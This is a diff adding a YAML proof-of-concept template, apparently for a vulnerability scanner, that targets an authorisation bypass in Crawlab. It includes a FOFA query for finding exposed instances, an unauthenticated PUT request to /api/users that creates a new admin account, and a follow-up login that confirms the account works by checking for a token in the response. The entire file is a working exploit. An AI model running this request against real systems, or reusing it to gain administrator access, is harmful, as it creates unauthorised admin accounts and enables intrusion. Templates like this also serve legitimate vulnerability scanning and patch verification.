@@ -1,0 +1,27 @@
+id: poc-yaml-crawlab-users-add
+info:
+  name: Crawlab users 任意用户添加漏洞
+  severity: high
+  tags:
+  - 权限绕过
+  finger: crawlab
+  fofa: title="Crawlab"
+variables:
+  t1: random_int(100,1000)
+requests:
+- method: PUT
+  path: /api/users
+  data: '{"username":"test{{.t1}}","password":"test123","role":"admin","email":"test123@qq.com"}
+
+    '
+  expression: "status_code == 200 && \ncontains(body,\"\\\"status\\\":\\\"ok\\\"\"\
+    ) &&\ncontains(body,\"\\\"success\\\"\")\n"
+- method: POST
+  path: /api/login
+  data: '{"username":"test{{.t1}}","password":"test123"}
+
+    '
+  expression: "status_code == 200 && \ncontains(body,\"\\\"status\\\":\\\"ok\\\"\"\
+    ) &&\ncontains(body,\"\\\"success\\\"\") &&\ncontains(body,\"\\\"data\\\"\") &&\n\
+    matches(body, `\\b[\\w-]+\\.[\\w-]+\\.[\\w-]+\\b`)\n"
+transport: http
